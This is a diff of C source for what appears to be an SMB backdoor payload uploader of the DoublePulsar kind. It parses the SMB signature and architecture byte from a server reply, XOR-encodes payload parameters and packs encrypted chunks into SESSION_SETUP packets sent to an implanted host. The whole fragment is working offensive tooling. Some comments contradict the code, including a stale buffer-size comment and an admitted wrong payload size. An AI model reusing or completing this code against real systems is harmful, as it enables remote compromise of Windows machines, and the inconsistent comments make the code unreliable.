@@ -567,14 +567,15 @@ int main(int argc, char* argv[])
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	
-	unsigned char signature[4]; //changed from 5 to 4 because I commented out the arch portion
+	unsigned char signature[6]; //changed from 5 to 4 because I commented out the arch portion
 	unsigned int sig;
 	//copy SMB signature from recvbuff to local buffer
 	signature[0] = recvbuff[18];
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
-	signature[4] = '\0';
+	signature[4] = recvbuff[22];
+	signature[5] = '\0';
 	
 	//this determines the architecture
 	//recvbuff[22];
@@ -664,7 +665,7 @@ int main(int argc, char* argv[])
 	int iterations = encrypted_buffer_len % 4096;
 	printf("will send %d packets of data\n ", numberofpackets);
 	printf("%d as a remainder\n", iterations);
-	char Parametersbuffer[12];
+	unsigned char Parametersbuffer[12];
 	
 	//PayloadSize is NOT correct; needs to be updated to actual value
 	unsigned int payload_size = 0x507308 ^ XorKey; //UPDATE PAYLOAD SIZE 
@@ -711,9 +712,9 @@ int main(int argc, char* argv[])
 			//update Offset value to current offset value
 			o_offset = ctx ^ XorKey;
 			//copy separate parameter values to the Parametersbuffer value
-			memcpy(Parametersbuffer, (char*)&payload_size, 4);
-			memcpy(Parametersbuffer + 4, (char*)&chunk_size, 4);
-			memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);
+			memcpy(Parametersbuffer, (unsigned char*)&payload_size, 4);
+			memcpy(Parametersbuffer + 4, (unsigned char*)&chunk_size, 4);
+			memcpy(Parametersbuffer + 8, (unsigned char*)&o_offset, 4);
 			
 			//copy the encrypted SESSION_SETUP parameters here before copying the last encrypted portion of the payload
 			memcpy(big_packet + 70, Parametersbuffer, 12);
